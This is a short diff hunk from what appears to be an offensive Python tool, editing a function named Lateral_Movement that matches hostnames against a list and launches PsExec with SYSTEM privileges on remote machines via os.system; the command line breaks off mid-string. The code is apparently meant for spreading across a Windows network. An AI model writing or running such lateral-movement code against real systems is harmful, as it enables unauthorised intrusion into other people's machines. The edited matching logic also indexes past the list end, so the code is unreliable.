@@ -218,9 +218,10 @@ def Lateral_Movement():
         line = f.readlines()
         line1 = f1.readlines()
         name = line1[0].split()
+        name1 = str(name[0]).upper()
         for i in range(len(lists)):
             lines = line[0].split(".")
-            if name[0] in lists[i]:
+            if not name1 in lists[i+1]:
                 j = i
                 for j in range(len(lists)-1):
                     return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
